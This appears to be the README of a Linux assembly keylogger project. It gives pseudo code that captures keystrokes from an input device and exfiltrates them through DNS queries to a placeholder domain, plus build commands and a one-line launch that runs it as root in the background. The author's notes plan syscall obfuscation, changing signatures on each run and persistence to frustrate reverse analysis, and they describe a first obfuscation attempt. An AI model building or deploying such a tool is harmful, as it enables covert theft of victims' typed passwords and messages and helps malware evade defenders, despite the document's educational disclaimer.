```
Is this an AI generated project ?

AI was used to facilitate the collection of informations as well as to fix syntax errors.
But all of the code was written by a human.
```

### Pseudo code
```
input_event = readOneInputEvent("/dev/input/event0")

key_temp_concat = ""

if input_event is a touch press event:
    key_code = to_ascii(key_code)
    key_temp_concat += key_code
    if len(key_temp_concat) == 10:
        dns_query(key_temp_concat.testdomaine.com)
```

### How to run ?

In the code change the domaine : "testdomaine" to a one you own. Or just leave the "testdomaine" if you just want to see the request in wireshark. 

#### Assemble with nasm
```
nasm -f elf64 keylogger.asm
```
*transform assembly into opcodes*

#### Link with ld
```
ld keylogger.o -o keylogger
```
*combines the opcodes files to create the executable*

#### Run as root and release the terminal
```
sudo ./keylogger </dev/null &
```

#### One-line launch
```
nasm -f elf64 keylogger.asm ; ld keylogger.o -o keylogger ; sudo ./keylogger </dev/null &
```

### Notes on the project
#### First analysis without obfuscation method (14/03/2026)

By running the program, you can see the DNS queries it performs.
![](img/wireshark.png)

The fact that binary ninja attempt to recreate the high-level code in which the program was never created is quite fun. However all the syscall, the data (domain and files) is perfectly understandable and clearly displayed. Therefore, it wouldn't be very difficult to recover all the IOCs using a reverse analysis.
![](img/binary%20ninja.png)

Things to add before the next analysis :
- syscall obfuscation
- dynamic signature generation allowing its fingerprint to be modified at each execution
- persistence mechanism

#### First attempt of syscall obfuscation
This first attempt consists of retrieving the syscall into a "num" file. 

cf : experimentation/syscall_obfuscation_first_attempt.asm

![](img/syscall_obfuscation_first_attempt.png)

The syscall is obfuscated ; sys_write is not recover by the decompiler, it's the buffer return by sys_read.

But it is still easy to retrieve the file and deduce the syscalls from it.

### Warning
Only use this program on a machine you own. This code was written for educational purposes.